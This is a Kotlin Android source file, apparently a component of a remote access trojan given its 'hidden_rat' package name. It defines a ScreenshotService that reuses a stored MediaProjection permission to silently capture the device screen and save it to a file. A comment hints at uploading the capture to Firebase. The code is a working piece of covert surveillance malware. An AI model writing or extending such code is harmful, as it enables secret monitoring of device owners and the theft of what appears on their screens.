package com.ratx.hidden_rat.service

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.res.Resources
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.Log
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream

class ScreenshotService : Service() {

    override fun onCreate() {
        super.onCreate()
        startForegroundNotification()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Handler(Looper.getMainLooper()).postDelayed({
            takeScreenshot()
        }, 1000)

        return START_NOT_STICKY
    }

    private fun startForegroundNotification() {
        val channelId = "screenshot_channel"
        val channel = NotificationChannel(
            channelId,
            "Screenshot Service",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        manager.createNotificationChannel(channel)

        val notification = Notification.Builder(this, channelId)
            .setContentTitle("Screenshot running...")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .build()

        startForeground(1, notification)
    }

    @SuppressLint("WrongConstant")
    private fun takeScreenshot() {
        val prefs = getSharedPreferences("screenshot_prefs", MODE_PRIVATE)
        val resultCode = prefs.getInt("resultCode", Activity.RESULT_CANCELED)
        val intentUri = prefs.getString("data", null)

        if (intentUri == null || resultCode == Activity.RESULT_CANCELED) {
            Log.e("ScreenshotService", "MediaProjection permission not found.")
            stopSelf()
            return
        }

        val dataIntent = Intent.parseUri(intentUri, 0)
        val projectionManager =
            getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val mediaProjection = projectionManager.getMediaProjection(resultCode, dataIntent)

        val metrics = Resources.getSystem().displayMetrics
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        val imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        mediaProjection.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader.surface, null, null
        )

        Handler(Looper.getMainLooper()).postDelayed({
            val image = imageReader.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val rowStride = planes[0].rowStride
                val pixelStride = planes[0].pixelStride
                val rowPadding = rowStride - pixelStride * width

                val bitmap = Bitmap.createBitmap(
                    width + rowPadding / pixelStride,
                    height,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                image.close()
                mediaProjection.stop()
                Log.d("ScreenshotService", "Screenshot captured successfully")

                saveTempScreenshot(bitmap)
            } else {
                Log.e("ScreenshotService", "No image captured.")
            }

            stopSelf()
        }, 1000)
    }

    private fun saveTempScreenshot(bitmap: Bitmap) {
        val file = File(getExternalFilesDir(null), "temp_screenshot.jpg")
        val stream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)

        FileOutputStream(file).use {
            it.write(stream.toByteArray())
            it.flush()
        }

        Log.d("ScreenshotService", "Screenshot saved at: ${file.absolutePath}")
        // Optionally: uploadToFirebase(file)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
